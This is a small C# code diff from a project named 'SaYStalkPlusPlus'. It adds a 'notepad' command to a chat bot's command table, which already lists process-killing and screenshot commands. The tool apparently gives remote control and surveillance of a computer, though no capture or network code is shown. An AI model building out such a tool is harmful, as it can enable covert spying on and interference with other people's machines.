@@ -9,6 +9,7 @@ namespace SaYStalkPlusPlus.src
 {
     internal class Bot
     {
+
         private string _token;
         private CancellationTokenSource _cancellationToken;
         public delegate CommandResult CommandDelegate(string[] args);
@@ -19,7 +20,8 @@ namespace SaYStalkPlusPlus.src
             { "killProcess", KillProcess.Execute},
             { "killSSPP", KillSaYStalkPlusPlus.Execute},
             { "takeScreen", TakeScreen.Execute },
-            {"commands", ShowAllCommands },
+            { "notepad", OpenNotepadAndWrite.Execute },
+            { "commands", ShowAllCommands },
 
         };
         const int MaxMessageLength = 4096;
